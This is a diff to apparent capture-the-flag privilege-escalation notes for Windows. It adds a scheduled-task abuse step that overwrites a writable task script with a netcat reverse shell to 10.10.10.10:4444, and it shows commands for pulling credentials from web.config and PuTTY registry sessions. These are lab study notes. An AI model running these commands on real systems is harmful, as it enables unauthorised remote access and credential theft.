@@ -38,3 +38,17 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 ```cmd
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
+
+# Scheduled Tasks ✅
+```cmd
+schtasks /query /tn vulntask /fo list /v # ⬇️⬇️⬇️⬇️⬇️⬇️
+# Folder: \
+# HostName:                             THM-PC1
+# TaskName:                             \vulntask
+# Task To Run:                          C:\tasks\schtask.bat
+# Run As User:                          taskusr1
+-------------------------------
+icacls c:\tasks\schtask.bat #  check the file permissions 
+------------------------------
+echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat
+```
